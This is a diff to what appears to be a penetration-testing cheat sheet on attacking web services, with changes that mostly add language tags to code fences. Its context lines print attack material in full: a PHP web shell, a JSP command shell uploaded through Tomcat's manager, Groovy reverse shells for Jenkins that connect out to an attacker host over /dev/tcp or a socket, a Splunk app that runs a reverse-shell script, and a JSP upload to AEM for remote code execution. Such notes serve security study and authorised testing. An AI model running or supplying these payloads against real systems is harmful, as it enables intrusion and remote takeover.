@@ -62,7 +62,7 @@ pagetitle: Attacking Services
   - Create a PHP shell with `<?php system($_GET['cmd']);?>`
   - Create an `.htaccess` file (as otherwise we won't be able to directly access the modules folder) with:
 
-```
+```xml
 <IfModule mod_rewrite.c>
 RewriteEngine On
 RewriteBase /
@@ -98,7 +98,7 @@ RewriteBase /
   - Can upload a `.war` file (tomcat application) to compromise the app
   - Navigate to `/manager/html` and upload the following file, zipped into an archive titled `{app_name}.war`
 
-```
+```jsp
 <%@ page import="java.util.*,java.io.*"%>
 <%
 //
@@ -163,7 +163,7 @@ if (request.getParameter("cmd") != null) {
 - Can run arbitrary commands via Apache Groovy scripts in the Script Console at `/script`
 - Linux reverse shell:
 
-```
+```sh
 r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{kali_ip}/{kali_port};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
@@ -171,7 +171,7 @@ p.waitFor()
 
 - Windows reverse shell:
 
-```
+```sh
 String host="{kali_ip}";
 int port={kali_port};
 String cmd="cmd.exe";
@@ -189,7 +189,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
     - These can be found in the above repo, and will need to be edited if intended for unix
   - Create `inputs.conf` in the directory root, which tells Splunk which scripts to run (run script every 10 seconds):
 
-```
+```sh
 [script://./bin/rev.py]
 disabled = 0  
 interval = 10  
@@ -200,6 +200,7 @@ disabled = 0
 sourcetype = shell
 interval = 10
 ```
+
   - Create a tarball with the repo with `tar -czvf {script_name}.tar.gz {script_directory_name}`
   - Then, in `/en-US/manager/search/apps/local` go to "Install app from file" and start the nc listener
   - Upload the tarball and upload, and scripts will be executed
@@ -272,7 +273,7 @@ interval = 10
 
 Basic RCE upload via POST to `/content/evil.jsp`:
 
-```
+```jsp
 :contentType=text/plain
 jcr:data=<% out.println("pwned"); %>
 :operation=import
